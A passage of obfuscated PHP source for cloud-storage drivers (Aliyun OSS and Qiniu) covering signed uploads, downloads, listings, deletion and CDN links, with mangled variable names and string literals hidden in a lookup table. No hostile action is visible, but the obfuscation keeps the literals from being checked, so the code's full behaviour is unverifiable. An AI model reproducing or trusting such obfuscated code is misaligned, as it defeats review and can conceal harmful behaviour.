(!$¹·åï®) { return !1; } $‚æ—êÖ = $this->_getUploadAuth($ˆâÆò›·, $°õı¸ƒ); return array($Ÿ™¨¤Ë[287] => $‚æ—êÖ[$Ÿ™¨¤Ë[287]], $Ÿ™¨¤Ë[283] => $‚æ—êÖ[$Ÿ™¨¤Ë[283]], $Ÿ™¨¤Ë[290] => $¹·åï®); } private function _getUploadAuth($ùø«“õ, $Æíò¦Á) { $¯±»×„” =& $_SERVER[€ä¾™²]; $¤„´Ø‘­ = gmdate($¯±»×„”[1647]); $ ñîÛ‡ = isset($Æíò¦Á[$¯±»×„”[284]]) ? $¯±»×„”[254] : $¯±»×„”[289]; $¹øĞ½´ = array_intersect_key($Æíò¦Á, array_flip(array($¯±»×„”[284], $¯±»×„”[282]))); ksort($¹øĞ½´); $œŠà¹Â· = $¹øĞ½´ ? $¯±»×„”[76] . http_build_query($¹øĞ½´, null, $¯±»×„”[285], PHP_QUERY_RFC3986) : $¯±»×„”[12]; $ßæğê”ê = array($ ñîÛ‡, $¯±»×„”[12], $¯±»×„”[121], $¤„´Ø‘­, "\170\55\157\163\x73\55\144\141\x74\x65\x3a{$¤„´Ø‘­}", $¯±»×„”[8] . $this->bucket . $¯±»×„”[8] . $ùø«“õ . $œŠà¹Â·); if (isset($Æíò¦Á[$¯±»×„”[284]])) { $É–™³µ = $this->trafficLimit($¯±»×„”[1640], array(), !0); if ($É–™³µ) { $ùø«“õ = $¯±»×„”[1648]; array_splice($ßæğê”ê, 5, 0, $ùø«“õ . $¯±»×„”[4] . $É–™³µ[$ùø«“õ]); } } $‰õ¥¦Ûœ = implode($¯±»×„”[286], $ßæğê”ê); $‡û†À„“ = base64_encode(hash_hmac($¯±»×„”[1470], $‰õ¥¦Ûœ, $this->secret, !0)); $ËÙ€–› = $¯±»×„”[1617] . $this->accessKey . $¯±»×„”[4] . $‡û†À„“; $Û¡æÆ†‘ = array($¯±»×„”[287] => $ËÙ€–›, $¯±»×„”[283] => $¤„´Ø‘­); if (!empty($É–™³µ)) { $Û¡æÆ†‘ = array_merge($Û¡æÆ†‘, $É–™³µ); } return $Û¡æÆ†‘; } public function download($ ÷ËìÄò, $¿’ã¼…è) { $é”œ‚Æü =& $_SERVER[€ä¾™²]; if ($this->isFolder($ ÷ËìÄò)) { return !1; } try { $í¡ÔÀ¿ˆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¿’ã¼…è); $í¡ÔÀ¿ˆ = $this->trafficLimit($é”œ‚Æü[110], $í¡ÔÀ¿ˆ); $this->client->getObject($this->bucket, $this->pathEncode($ ÷ËìÄò), $í¡ÔÀ¿ˆ); } catch (OSS\Core\OssException $ğÖÃøêó) { $this->writeLog(__FUNCTION__ . $é”œ‚Æü[213] . $ğÖÃøêó->getMessage()); return !1; } return $¿’ã¼…è; } public function fileSubstr($ø˜š°², $‹’Ë‡åé = 0, $à¬»€ÆÃ = false) { if ($‹’Ë‡åé === -1) { $•ŠŠöñÛ = array(); } else { if ($à¬»€ÆÃ === !1) { $‘ŠÏÒßğ = $this->size($ø˜š°²); } else { $‘ŠÏÒßğ = $‹’Ë‡åé + $à¬»€ÆÃ - 1; } $•ŠŠöñÛ = array(OSS\OssClient::OSS_RANGE => "{$‹’Ë‡åé}\x2d{$‘ŠÏÒßğ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ø˜š°²), $•ŠŠöñÛ); } catch (OSS\Core\OssException $·–í‘ğò) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $·–í‘ğò->getMessage()); think_exception($·–í‘ğò->getMessage()); return !1; } } private function trafficLimit($õÍæâ©‘, $Ìõ²ñŸ = array(), $Û×Ñ«§Û = false) { $Á™¤ı =& $_SERVER[€ä¾™²]; if ($õÍæâ©‘ == $Á™¤ı[1640] && $this->isUploadServer() || $õÍæâ©‘ == $Á™¤ı[110] && $this->isFileOutServer()) { return $Ìõ²ñŸ; } $ô”Œ²í’ = floatval($GLOBALS[$Á™¤ı[6]][$Á™¤ı[92]][$Á™¤ı[108]][$õÍæâ©‘]) * 1024 * 1024 * 8; if (!$ô”Œ²í’) { return $Ìõ²ñŸ; } $ô”Œ²í’ = $ô”Œ²í’ < 819200 ? 819200 : ($ô”Œ²í’ > 838860800 ? 838860800 : $ô”Œ²í’); if ($Û×Ñ«§Û) { $Ìõ²ñŸ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ô”Œ²í’); } else { if (!isset($Ìõ²ñŸ[OSS\OssClient::OSS_HEADERS])) { $Ìõ²ñŸ[OSS\OssClient::OSS_HEADERS] = array(); } $Ìõ²ñŸ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ô”Œ²í’); } return $Ìõ²ñŸ; } public function link($¶ÓÍ‚Òó, $Šã¥´Şü = array()) { $Æœšîç =& $_SERVER[€ä¾™²]; if (!$this->exist($¶ÓÍ‚Òó) || $this->isFolder($¶ÓÍ‚Òó)) { return !1; } try { $Šã¥´Şü = $this->trafficLimit($Æœšîç[110], $Šã¥´Şü, !0); $Õ„´°Ä = $this->client->signUrl($this->bucket, $this->pathEncode($¶ÓÍ‚Òó), 3600 * 12, $Æœšîç[1552], $Šã¥´Şü); return $this->getCdnLink($Õ„´°Ä); } catch (OSS\Core\OssException $Àîª©°İ) { $this->writeLog(__FUNCTION__ . $Æœšîç[213] . $Àîª©°İ->getMessage()); return !1; } } public function fileOut($âÙî¼Õ®, $µÎË†¼² = false, $ú²Š‡ô„ = false, $ËØ«ÜÉ = '') { $ºÁ£˜“Æ =& $_SERVER[€ä¾™²]; if ($this->isFileOutServer()) { return $this->fileOutServer($âÙî¼Õ®, $µÎË†¼², $ú²Š‡ô„, $ËØ«ÜÉ); } if (!$ú²Š‡ô„) { $ú²Š‡ô„ = $this->pathThis($âÙî¼Õ®); } $ú²Š‡ô„ = rawurlencode($ú²Š‡ô„); $ü”¤Ú¾µ = get_file_mime(get_path_ext($ú²Š‡ô„)); if ($ü”¤Ú¾µ == $ºÁ£˜“Æ[249]) { return parent::fileOut($âÙî¼Õ®, $µÎË†¼², $ú²Š‡ô„, $ËØ«ÜÉ); } $µÎË†¼² = $µÎË†¼² ? $ºÁ£˜“Æ[1649] : $ºÁ£˜“Æ[1650]; $ìñ•²şã = array(OSS\OssClient::OSS_SUB_RESOURCE => $ºÁ£˜“Æ[1651] . rawurlencode("{$µÎË†¼²}\73\146\x69\x6c\145\x6e\141\x6d\x65\75{$ú²Š‡ô„}")); $åÍúÄ£¡ = $this->link($âÙî¼Õ®, $ìñ•²şã); $this->fileOutLink($åÍúÄ£¡); } public function fileOutServer($Ì›ŒÄ¢Š, $ƒ÷˜å«ˆ = false, $­—ó’ğ€ = false, $È Şì½˜ = '') { parent::fileOut($Ì›ŒÄ¢Š, $ƒ÷˜å«ˆ, $­—ó’ğ€, $È Şì½˜); } public function fileOutImage($³ãÂÔÛ, $¨¼€•¨ = 250) { if ($this->size($³ãÂÔÛ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($³ãÂÔÛ, $¨¼€•¨); } $İøåšô = array(OSS\OssClient::OSS_PROCESS => $_SERVER[€ä¾™²][1614] . $¨¼€•¨); $©çÒ‘ùÁ = $this->link($³ãÂÔÛ, $İøåšô); $this->fileOutLink($©çÒ‘ùÁ); } public function fileOutImageServer($€¤óîŒÑ, $õ«ıôÊ = 250) { parent::fileOutImage($€¤óîŒÑ, $õ«ıôÊ); } public function fileOutLink($Éì˜¶í) { $‡„¨Ó‹² =& $_SERVER[€ä¾™²]; if (!$this->isCdnHost() && substr($Éì˜¶í, 0, 7) == $‡„¨Ó‹²[217]) { $Éì˜¶í = $‡„¨Ó‹²[218] . substr($Éì˜¶í, 7); } header($‡„¨Ó‹²[173] . $Éì˜¶í); die; } public function hashMd5($‡“€£‰, $µÈ€§ôŞ = '') { $Ú¿ºÑ· =& $_SERVER[€ä¾™²]; $¹ûÁßò = $this->_objectMeta($‡“€£‰); if (!$¹ûÁßò) { return $Ú¿ºÑ·[12]; } if (!isset($¹ûÁßò[$Ú¿ºÑ·[1634]]) && !empty($µÈ€§ôŞ)) { $™åÌÅé‰ = $this->updateObjMeta($‡“€£‰, array($Ú¿ºÑ·[1634] => $µÈ€§ôŞ)); $¹ûÁßò[$Ú¿ºÑ·[1634]] = $™åÌÅé‰ ? $µÈ€§ôŞ : $Ú¿ºÑ·[12]; } return isset($¹ûÁßò[$Ú¿ºÑ·[1634]]) ? strtolower($¹ûÁßò[$Ú¿ºÑ·[1634]]) : $Ú¿ºÑ·[12]; } public function size($Šı³˜İ) { $ãôÒïñ€ = $this->objectMeta($Šı³˜İ); return $ãôÒïñ€ ? $ãôÒïñ€[$_SERVER[€ä¾™²][79]] : 0; } public function info($¿Œ¬éÁ±) { if ($this->isFolder($¿Œ¬éÁ±)) { return $this->folderInfo($¿Œ¬éÁ±); } else { if ($this->isFile($¿Œ¬éÁ±)) { return $this->fileInfo($¿Œ¬éÁ±); } } return !1; } public function exist($„ˆÇÈÂ¾) { return $this->isFile($„ˆÇÈÂ¾) || $this->isFolder($„ˆÇÈÂ¾); } public function isFile($ÈÏâøÊ) { return !$this->isFolder($ÈÏâøÊ) && $this->objectMeta($ÈÏâøÊ); } public function isFolder($ü’‚©Œ») { return $this->cacheMethod($_SERVER[€ä¾™²][178], $ü’‚©Œ»); } protected function objectMeta($­í¦Ê¥“) { return $this->cacheMethod($_SERVER[€ä¾™²][180], $­í¦Ê¥“); } protected function _objectMeta($Î°…Ì…ô) { $ìÖœ•Û =& $_SERVER[€ä¾™²]; try { $Ú™Šê¡ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Î°…Ì…ô)); } catch (OSS\Core\OssException $ë·›´õ) { $this->writeLog(__FUNCTION__ . $ìÖœ•Û[213] . $ë·›´õ->getMessage()); $Ú™Šê¡ = !1; } if ($Ú™Šê¡) { $Ú™Šê¡[$ìÖœ•Û[79]] = intval($Ú™Šê¡[$ìÖœ•Û[1632]]); } return $Ú™Šê¡; } protected function _isFolder($ÒŒâ¹æ®) { $û·ˆ¶ø =& $_SERVER[€ä¾™²]; if ($ÒŒâ¹æ® == $û·ˆ¶ø[12] || $ÒŒâ¹æ® == $û·ˆ¶ø[8]) { return !0; } $ıç©å÷ = array($û·ˆ¶ø[1627] => $û·ˆ¶ø[8], $û·ˆ¶ø[1628] => rtrim($ÒŒâ¹æ®, $û·ˆ¶ø[8]) . $û·ˆ¶ø[8], $û·ˆ¶ø[1629] => 1, $û·ˆ¶ø[1630] => $û·ˆ¶ø[12]); $ ©–êŞâ = $this->client->listObjects($this->bucket, $ıç©å÷); if ($ ©–êŞâ->getObjectList() || $ ©–êŞâ->getPrefixList()) { return !0; } return !1; } public function writeLog($Í¤˜Ó¶ø = '', $ë°†ÈŠÔ = false) { $ô¹Ñ½©ò =& $_SERVER[€ä¾™²]; $¨§¹öø‹ = in_array(ACTION, array($ô¹Ñ½©ò[211], $ô¹Ñ½©ò[212])); if (!$¨§¹öø‹ && !GLOBAL_DEBUG) { return; } $Êù÷ëÍ = 0; if (stripos($Í¤˜Ó¶ø, $ô¹Ñ½©ò[1652]) !== !1) { $Êù÷ëÍ = 1; $»èƒÎæò = explode($ô¹Ñ½©ò[1653], $Í¤˜Ó¶ø); $Í¤˜Ó¶ø = !empty($»èƒÎæò[1]) ? $»èƒÎæò[1] : $Í¤˜Ó¶ø; } else { if (stripos($Í¤˜Ó¶ø, $ô¹Ñ½©ò[1654])) { $Êù÷ëÍ = 2; $»èƒÎæò = explode($ô¹Ñ½©ò[1654], $Í¤˜Ó¶ø); $»èƒÎæò = explode($ô¹Ñ½©ò[4], $»èƒÎæò[0]); $Í¤˜Ó¶ø = !empty($»èƒÎæò[1]) ? $»èƒÎæò[1] : $Í¤˜Ó¶ø; } } if ($¨§¹öø‹ && I18n::getType() == $ô¹Ñ½©ò[1655]) { if ($Êù÷ëÍ == 1) { $Í¤˜Ó¶ø = str_replace($ô¹Ñ½©ò[1656], $ô¹Ñ½©ò[1657], $Í¤˜Ó¶ø); } else { if ($Êù÷ëÍ == 2) { $»èƒÎæò = explode($ô¹Ñ½©ò[213], $»èƒÎæò[0]); $½¼‚Ì° = isset($»èƒÎæò[1]) ? $»èƒÎæò[1] : $ô¹Ñ½©ò[12]; $ ˆ£Õç = array($ô¹Ñ½©ò[1658] => $ô¹Ñ½©ò[1659], $ô¹Ñ½©ò[1660] => $ô¹Ñ½©ò[1661], $ô¹Ñ½©ò[1662] => $ô¹Ñ½©ò[1663], $ô¹Ñ½©ò[1664] => $ô¹Ñ½©ò[1665], $ô¹Ñ½©ò[1666] => $ô¹Ñ½©ò[1667], $ô¹Ñ½©ò[1668] => $ô¹Ñ½©ò[1669], $ô¹Ñ½©ò[1670] => $ô¹Ñ½©ò[1671], $ô¹Ñ½©ò[1672] => $ô¹Ñ½©ò[1673], $ô¹Ñ½©ò[1674] => $ô¹Ñ½©ò[1675], $ô¹Ñ½©ò[1676] => $ô¹Ñ½©ò[1677]); if (isset($ ˆ£Õç[$½¼‚Ì°])) { $Í¤˜Ó¶ø = $ ˆ£Õç[$½¼‚Ì°]; } } } if (stripos($Í¤˜Ó¶ø, $ô¹Ñ½©ò[1678])) { $Í¤˜Ó¶ø = $ô¹Ñ½©ò[1679]; } } if (!trim($Í¤˜Ó¶ø)) { return; } parent::writeLog(trim($Í¤˜Ó¶ø), $ë°†ÈŠÔ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ô¸ø§˜ ) { parent::__construct(); require_once SDK_DIR . $_SERVER[€ä¾™²][1680]; $this->_init($Ô¸ø§˜ ); } public function _init($Õë¸Ö¤ˆ) { $ñæ‰Æ£ =& $_SERVER[€ä¾™²]; $this->config = $Õë¸Ö¤ˆ; foreach ($Õë¸Ö¤ˆ as $Ê¸œÉÑ => $€ç½±) { if (isset($this->{$Ê¸œÉÑ})) { $this->{$Ê¸œÉÑ} = $€ç½±; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ñæ‰Æ£[1681] . LNG($ñæ‰Æ£[1618])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($³±ö¥–¼, $Å¬Õ¡Ø¡ = '', $ÒÜåÇ»Á = REPEAT_RENAME) { if ($this->setContent($³±ö¥–¼, $Å¬Õ¡Ø¡)) { return $this->getPathOuter($³±ö¥–¼); } return !1; } public function mkdir($ªøò¼ïˆ, $›ÊİÑŠ = REPEAT_SKIP) { $Ñ¥üªãØ =& $_SERVER[€ä¾™²]; $ù¨šâà = trim($ªøò¼ïˆ, $Ñ¥üªãØ[8]); if ($this->_isFolder($ù¨šâà)) { return $this->getPathOuter($ù¨šâà); } $ªøò¼ïˆ = $ù¨šâà . $Ñ¥üªãØ[8]; $ººŠØÂÚ = get_path_this($ù¨šâà); $¼™ÚÕ’Á = $ªøò¼ïˆ . $ººŠØÂÚ; if (!$this->mkfile($¼™ÚÕ’Á)) { return !1; } if (!$this->moveFile($¼™ÚÕ’Á, $ªøò¼ïˆ)) { $this->delFile($¼™ÚÕ’Á); return !1; } return $this->getPathOuter($ù¨šâà); } public function copyFile($ƒ¶ãæ– , $ÕË¥»ŠÑ) { $À„‰¤Ş¦ = $this->bucketManager->copy($this->bucket, $ƒ¶ãæ– , $this->bucket, $ÕË¥»ŠÑ, !0); return $À„‰¤Ş¦ ? !1 : $this->getPathOuter($ÕË¥»ŠÑ); } public function moveFile($ÏçÚˆúï, $­³ç¦ı) { $ãƒÏøïì = $this->bucketManager->move($this->bucket, $ÏçÚˆúï, $this->bucket, $­³ç¦ı, !0); return $ãƒÏøïì ? !1 : $this->getPathOuter($­³ç¦ı); } public function delFile($«ÏâÊŞÃ) { if (!$this->exist($«ÏâÊŞÃ)) { return !0; } $˜Å¢òË‡ = $this->bucketManager->delete($this->bucket, $«ÏâÊŞÃ); if (!$˜Å¢òË‡) { return !0; } return $˜Å¢òË‡->code() == 612 ? !0 : !1; } public function delFolder($üÚ‚Ó£ï) { $†Í×ì¥ =& $_SERVER[€ä¾™²]; if (!$this->exist($üÚ‚Ó£ï)) { return !0; } $this->listItemCache = !1; $ñ±›”òƒ = $this->fileList($üÚ‚Ó£ï); $this->listItemCache = !0; $¦€¶ÄÖ = trim($üÚ‚Ó£ï, $†Í×ì¥[8]) . $†Í×ì¥[8]; if (!empty($üÚ‚Ó£ï) && $üÚ‚Ó£ï !== $†Í×ì¥[229] && !in_array($¦€¶ÄÖ, $ñ±›”òƒ[$†Í×ì¥[85]])) { $ñ±›”òƒ[$†Í×ì¥[85]][] = $¦€¶ÄÖ; } $«ñÁ¨£æ = $this->delByBatch($ñ±›”òƒ[$†Í×ì¥[86]]); if (!$«ñÁ¨£æ) { return !1; } $«ñÁ¨£æ = $this->delByBatch($ñ±›”òƒ[$†Í×ì¥[85]]); if (!$«ñÁ¨£æ) { return !1; } return $this->delFile($¦€¶ÄÖ); } private function delByBatch($«Å¢Ô™²) { foreach (array_chunk($«Å¢Ô™², 1000) as $„ººÀõ) { $ìıĞ–ş‰ = $this->bucketManager->buildBatchDelete($this->bucket, $„ººÀõ); list($šÈıÕÀì, $ÔøØ–Ø­) = $this->bucketManager->batch($ìıĞ–ş‰); if ($ÔøØ–Ø­) { return !1; } } return !0; } public function rename($“éÛ˜Á, $´œƒ‰¯½) { return $this->renameObject($“éÛ˜Á, $´œƒ‰¯½); } public function fileInfo($Ä¬è±‹ƒ, $îóøÂ­Ñ = false, $•¾«”á = array()) { $º†ê»ƒ =& $_SERVER[€ä¾™²]; $Ê¡Ä–­„ = array($º†ê»ƒ[32] => $this->pathThis($Ä¬è±‹ƒ), $º†ê»ƒ[87] => $this->getPathOuter($º†ê»ƒ[8] . $Ä¬è±‹ƒ), $º†ê»ƒ[33] => $º†ê»ƒ[231], $º†ê»ƒ[79] => isset($•¾«”á[$º†ê»ƒ[1682]]) ? $•¾«”á[$º†ê»ƒ[1682]] : 0, $º†ê»ƒ[167] => $this->ext($Ä¬è±‹ƒ)); if ($îóøÂ­Ñ) { return $Ê¡Ä–­„; } $Ê¡Ä–­„[$º†ê»ƒ[232]] = $Ê¡Ä–­„[$º†ê»ƒ[88]] = 0; $Ê¡Ä–­„[$º†ê»ƒ[233]] = $Ê¡Ä–­„[$º†ê»ƒ[234]] = !0; if (empty($•¾«”á)) { $•¾«”á = $this->objectMeta($Ä¬è±‹ƒ); if (!$•¾«”á) { return $Ê¡Ä–­„; } } if (isset($•¾«”á[$º†ê»ƒ[235]]) && $•¾«”á[$º†ê»ƒ[235]]) { $Ê¡Ä–­„[$º†ê»ƒ[236]] = $•¾«”á[$º†ê»ƒ[235]]; } if (isset($•¾«”á[$º†ê»ƒ[246]]) && $•¾«”á[$º†ê»ƒ[246]]) { $Ê¡Ä–­„[$º†ê»ƒ[236]] = $•¾«”á[$º†ê»ƒ[246]]; } if (isset($•¾«”á[$º†ê»ƒ[1683]])) { $Ê¡Ä–­„[$º†ê»ƒ[88]] = substr($•¾«”á[$º†ê»ƒ[1683]] . $º†ê»ƒ[12], 0, 10); } if (isset($•¾«”á[$º†ê»ƒ[1682]])) { $Ê¡Ä–­„[$º†ê»ƒ[79]] = $•¾«”á[$º†ê»ƒ[1682]]; } return $Ê¡Ä–­„; } public function folderInfo($‡å‚ôšê, $Ç¥‡Øïƒ = false) { $ŠÏû×âÍ =& $_SERVER[€ä¾™²]; $ë©™‹„ = array($ŠÏû×âÍ[32] => $this->pathThis($‡å‚ôšê), $ŠÏû×âÍ[87] => $this->getPathOuter($ŠÏû×âÍ[8] . $‡å‚ôšê), $ŠÏû×âÍ[33] => $ŠÏû×âÍ[78]); if ($Ç¥‡Øïƒ) { return $ë©™‹„; } $ë©™‹„[$ŠÏû×âÍ[232]] = $ë©™‹„[$ŠÏû×âÍ[88]] = 0; $ë©™‹„[$ŠÏû×âÍ[233]] = $ë©™‹„[$ŠÏû×âÍ[234]] = !0; $‡å‚ôšê = rtrim($‡å‚ôšê, $ŠÏû×âÍ[8]) . $ŠÏû×âÍ[8]; $¼ˆº²èá = $this->objectMeta($‡å‚ôšê); if (isset($¼ˆº²èá[$ŠÏû×âÍ[1683]])) { $ë©™‹„[$ŠÏû×âÍ[88]] = substr($¼ˆº²èá[$ŠÏû×âÍ[1683]] . $ŠÏû×âÍ[12], 0, 10); } return $ë©™‹„; } public function listPath($ßÑ®Óï, $½ğĞ—ÑÆ = false) { $Æì«±ëƒ =& $_SERVER[€ä¾™²]; $×ëÌ›“ƒ = $this->fileList($ßÑ®Óï, $Æì«±ëƒ[8], !0); foreach ($×ëÌ›“ƒ[$Æì«±ëƒ[85]] as $°“é Ğ™ => $êÆñøú) { $×ëÌ›“ƒ[$Æì«±ëƒ[85]][$°“é Ğ™] = $this->folderInfo($êÆñøú, $½ğĞ—ÑÆ); } foreach ($×ëÌ›“ƒ[$Æì«±ëƒ[86]] as $°“é Ğ™ => $êÆñøú) { $×ëÌ›“ƒ[$Æì«±ëƒ[86]][$°“é Ğ™] = $this->fileInfo($êÆñøú[$Æì«±ëƒ[32]], $½ğĞ—ÑÆ, $êÆñøú); } return $×ëÌ›“ƒ; } public function has($ã°°™ì, $…’´•šÁ = false, $ìş…‚Ñ’ = true) { $•Ó©—êÔ =& $_SERVER[€ä¾™²]; $ã°°™ì = trim($ã°°™ì, $•Ó©—êÔ[8]); $£®—¢¹× = empty($ã°°™ì) && $ã°°™ì !== $•Ó©—êÔ[229] ? $•Ó©—êÔ[12] : $ã°°™ì . $•Ó©—êÔ[8]; $Åë«ééì = $•Ó©—êÔ[12]; $¦¥”Ùø = 500; $ºüæÓ’« = $•Ó©—êÔ[8]; $ÌİÃ½ã‡ = $åü¬“¶õ = 0; while (!0) { check_abort(); list($Œê², $Û°½Â›Û) = $this->bucketManager->listFiles($this->bucket, $£®—¢¹×, $Åë«ééì, $¦¥”Ùø, $ºüæÓ’«); if ($Û°½Â›Û) { break; } $Åë«ééì = array_key_exists($•Ó©—êÔ[1630], $Œê²) ? $Åë«ééì = $Œê²[$•Ó©—êÔ[1684]] : $•Ó©—êÔ[12]; if ($…’´•šÁ) { if (!empty($Œê²[$•Ó©—êÔ[1685]])) { $ÌİÃ½ã‡ += count($Œê²[$•Ó©—êÔ[1685]]); } if (!empty($Œê²[$•Ó©—êÔ[1686]])) { $åü¬“¶õ += count($Œê²[$•Ó©—êÔ[1686]]); } if ($Åë«ééì === $•Ó©—êÔ[12]) { break; } continue; } if ($ìş…‚Ñ’) { if (!empty($Œê²[$•Ó©—êÔ[1685]])) { return !0; } } else { if (!empty($Œê²[$•Ó©—êÔ[1686]])) { return !0; } } if ($Åë«ééì === $•Ó©—êÔ[12]) { break; } } if ($…’´•šÁ) { return array($•Ó©—êÔ[240] => $ÌİÃ½ã‡, $•Ó©—êÔ[241] => $åü¬“¶õ); } return !1; } public function listAll($€µÆÊ™È) { $¬‹¸È­ò =& $_SERVER[€ä¾™²]; $¼Å«Î€Ò = $this->fileList($€µÆÊ™È, $¬‹¸È­ò[12], !0); $ƒŒ–‘¹Ş = array_to_keyvalue($¼Å«Î€Ò[$¬‹¸È­ò[86]], $¬‹¸È­ò[32]); foreach ($¼Å«Î€Ò[$¬‹¸È­ò[85]] as $â˜òá·ü) { if (is_string($â˜òá·ü)) { $ƒŒ–‘¹Ş[$â˜òá·ü] = array($¬‹¸È­ò[79] => 0); } } return $this->listAllFiles($€µÆÊ™È, $ƒŒ–‘¹Ş); } private function fileList($“àêÒ°ä, $ÉÈïü‡À = '', $°›½ã˜† = 0) { $×‡ò¿ê =& $_SERVER[€ä¾™²]; $“àêÒ°ä = trim($“àêÒ°ä, $×‡ò¿ê[8]); $™¬¹¹‘ = empty($“àêÒ°ä) && $“àêÒ°ä !== $×‡ò¿ê[229] ? $×‡ò¿ê[12] : $“àêÒ°ä . $×‡ò¿ê[8]; $°Ù‹ğÖ = $×‡ò¿ê[12]; $ï„ÖãÒÍ = 1000; $´—¼Ê¨è = $Õí²šÓú = array(); while (!0) { check_abort(); list($ ±˜Ç•, $¹”¹…ß) = $this->bucketManager->listFiles($this->bucket, $™¬¹¹‘, $°Ù‹ğÖ, $ï„ÖãÒÍ, $ÉÈïü‡À); if ($¹”¹…ß) { break; } $°Ù‹ğÖ = array_key_exists($×‡ò¿ê[1630], $ ±˜Ç•) ? $°Ù‹ğÖ = $ ±˜Ç•[$×‡ò¿ê[1684]] : $×‡ò¿ê[12]; $‘ŞˆšÍ = isset($ ±˜Ç•[$×‡ò¿ê[1685]]) ? $ ±˜Ç•[$×‡ò¿ê[1685]] : array(); $öÙ‡ = isset($ ±˜Ç•[$×‡ò¿ê[1686]]) ? $ ±˜Ç•[$×‡ò¿ê[1686]] : array(); foreach ($‘ŞˆšÍ as $›ÄÒ¾) { if ($›ÄÒ¾[$×‡ò¿ê[95]] == $™¬¹¹‘) { continue; } $Ññ¯³Ï¾ = $›ÄÒ¾[$×‡ò¿ê[95]]; $§¡¤÷í— = $›ÄÒ¾[$×‡ò¿ê[1682]]; $›ÄÒ¾[$×‡ò¿ê[32]] = $Ññ¯³Ï¾; $›ÄÒ¾[$×‡ò¿ê[79]] = $§¡¤÷í—; $şßú¶Êœ = $§¡¤÷í— == 0 && substr($Ññ¯³Ï¾, strlen($Ññ¯³Ï¾) - 1, 1) == $×‡ò¿ê[8] ? !0 : !1; $this->cacheMethodInfoSet($Ññ¯³Ï¾, $şßú¶Êœ, $›ÄÒ¾); if ($şßú¶Êœ) { $´—¼Ê¨è[] = $Ññ¯³Ï¾; continue; } $Õí²šÓú[] = $°›½ã˜† ? $›ÄÒ¾ : $Ññ¯³Ï¾; } foreach ($öÙ‡ as $Ññ¯³Ï¾) { if ($Ññ¯³Ï¾ == $™¬¹¹‘) { continue; } $´—¼Ê¨è[] = $Ññ¯³Ï¾; $this->cacheMethodInfoSet($Ññ¯³Ï¾, !0); } if ($°Ù‹ğÖ === $×‡ò¿ê[12]) { break; } } $this->cacheMethodInfoSet($“àêÒ°ä, !0); return array($×‡ò¿ê[85] => $´—¼Ê¨è, $×‡ò¿ê[86] => $Õí²šÓú); } public function canRead($¨ÄŸÑóã) { return $this->exist($¨ÄŸÑóã) ? !0 : !1; } public function canWrite($ÌŸ­øå¥) { return $this->exist($ÌŸ­øå¥) ? !0 : !1; } public function getContent($§Ìã¡ë) { return $this->fileSubstr($§Ìã¡ë, 0, -1); } public function setContent($ÂÑœ—‘, $Û§Ù…± = '') { $çş´…Š€ = $this->tempFile($this->pathThis($ÂÑœ—‘)); file_put_contents($çş´…Š€, $Û§Ù…±); if ($this->upload($ÂÑœ—‘, $çş´…Š€)) { $this->tempFileRemve($çş´…Š€); return !0; } return !1; } public function refreshUrls($ÏÕæ›Ò†) { $µ¶€Š–£ =& $_SERVER[€ä¾™²]; $µÈÅÈ¿Ï = array(); if (is_array($ÏÕæ›Ò†)) { foreach ($ÏÕæ›Ò† as $®´êÑŸª) { $µÈÅÈ¿Ï[] = $this->link($®´êÑŸª); } } else { $µÈÅÈ¿Ï[] = $this->link($ÏÕæ›Ò†); } $Õ”Øô‡› = new Qiniu\Cdn\CdnManager($this->auth); list($êò¢Ä, $Š›Æ©ãÇ) = $Õ”Øô‡›->refreshUrls($µÈÅÈ¿Ï); if ($Š›Æ©ãÇ) { return !1; } return $êò¢Ä[$µ¶€Š–£[1314]] == $µ¶€Š–£[860] ? !0 : !1; } public function fileSubstr($†á„óÂş, $ƒ¢ç˜–ˆ, $ºÓÆ—¸í) { $á¼ó¢‡ =& $_SERVER[€ä¾™²]; if (!($ö€ÒÕ” = $this->link($†á„óÂş))) { return !1; } $˜Éø¼Ğ¦ = !1; if ($ºÓÆ—¸í > 0) { $âÄ†×Â› = $ƒ¢ç˜–ˆ + $ºÓÆ—¸í - 1; $˜Éø¼Ğ¦ = array($á¼ó¢‡[1551] . $ƒ¢ç˜–ˆ . $á¼ó¢‡[476] . $âÄ†×Â›); } $şèÏØ› = url_request($ö€ÒÕ”, $á¼ó¢‡[1552], !1, $˜Éø¼Ğ¦); return $şèÏØ›[$á¼ó¢‡[850]] ? $şèÏØ›[$á¼ó¢‡[1336]] : !1; } public function upload($‘Ûæİâ, $Ãù‰ÆÛ, $Ÿ¶øü¹ò = false, $—®£ƒÇÁ = REPEAT_REPLACE) { if (!$Ãù‰ÆÛ || !@file_exists($Ãù‰ÆÛ)) { return !1; } $Î´İÉò = new Qiniu\Storage\UploadManager(); $ô„«êÉ = $this->auth->uploadToken($this->bucket, $‘Ûæİâ); $ËäÎ¾äô = get_file_mime(get_path_ext($Ãù‰ÆÛ)); list($¡É¸üÁƒ, $ëÇŞôü¾) = $Î´İÉò->putFile($ô„«êÉ, $‘Ûæİâ, $Ãù‰ÆÛ, null, $ËäÎ¾äô); return $ëÇŞôü¾ ? !1 : $this->getPathOuter($‘Ûæİâ); } public function uploadFormData($â£ËØ‚í, $Ø‹İ¼€ = 3600) { return $this->uploadToken($â£ËØ‚í, $Ø‹İ¼€); } public function uploadMultiData($ã†ß»ÇÔ, $×Êù‰£ = 3600) { return $this->uploadToken($ã†ß»ÇÔ, $×Êù‰£); } private function uploadToken($á‚Ğæ, $°ÙííÔ = 3600) { $æ­ÅÔ‚ =& 